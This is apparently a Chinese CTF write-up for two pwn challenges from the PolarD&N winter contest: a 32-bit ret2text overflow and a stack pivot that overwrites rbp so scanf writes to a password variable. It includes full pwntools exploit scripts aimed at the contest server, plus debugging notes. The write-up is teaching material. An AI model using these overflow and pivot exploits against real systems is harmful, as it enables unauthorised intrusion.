# PolarD&N冬季个人赛wp

> 题目可以在[这里](https://www.polarctf.com/#/page/challenges)找，就不上附件了（版权）

## like_lib3

32位***ret2text***

```python
from pwn import *
#p = process('./pwn')
p = remote('1.95.36.136',2055)
elf = ELF('./pwn')
sys = elf.sym['system']
payload = b'b'*(0x2c+4)+p32(sys)+p32(0)+p32(0x0804857c)
p.sendline(payload)
p.interactive()
```

## stack

***栈迁移***，但不多

通过栈迁移覆盖`rbp`的值，让`rbp`的位置变成`passwd`，从而实现任意地址读写

需要注意`scanf`函数读取的偏移是`4`

<img src="./images/image-20250203140921533.png" alt="image-20250203140921533" style="zoom:67%;" />

所以可以将`passwd`迁移到`rbp+0x4`的位置，这样通过`scanf`读入寻址，刚好读到`rbp`上

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('1.95.36.136',2138)
def dbg():
    gdb.attach(p)
    pause()

passwd_addr = 0x4033CC
payload = b'b'*0x50+p64(passwd_addr+0x4)
p.sendline(payload)

p.sendlineafter("input1:","4660")
p.interactive()
```

有些不理解？我们调试看看

- 未输入payload时

![image-20250203142323438](./images/image-20250203142323438.png)

> 可以看到此时的rbp还是存储的栈结尾地址，`0x7ffedda9ade0`

- 输入`payload`

![image-20250203142504855](./images/image-20250203142504855.png)

> 可以看到此时`rbp`已经被额外的数据覆盖了，这里`0x4033d0`也就是`passwd_addr+0x4`

- `scanf`之后

  ![image-20250203143114522](./images/image-20250203143114522.png)

  

> 这里是将`rax`的值赋给`rbp-4`,而rax暂时存储我们的输入，也就是说，这里将4660传递给了`rbp-4`的位置，那么我们的`rbp`是多少呢，`passwd_addr+0x4`!，所以4660传递给了`passwd`,完成

- 那v4呢？接着看

  ![image-20250203143717093](./images/image-20250203143717093.png)

![image-20250203143733532](./images/image-20250203143733532.png)s

> 可以看一下静态汇编，这里第一个判断是将`passwd`的值传给`eax`,然后比较；第二个判断是`rbp-4`的位置传递给`eax`，然后比较。
>
> 同时动态调试这里也展示的很清楚，pwndbg直接给解释为两次对`passwd`和`0x1234`比较
>
> 所以v4，其实已经被抛弃了（瓦达西...)

总之呢，这里可以实现的关键在于**局部变量的寻值是按照rbp的相对偏移**，所以将rbp移动后会改变寻值的对象
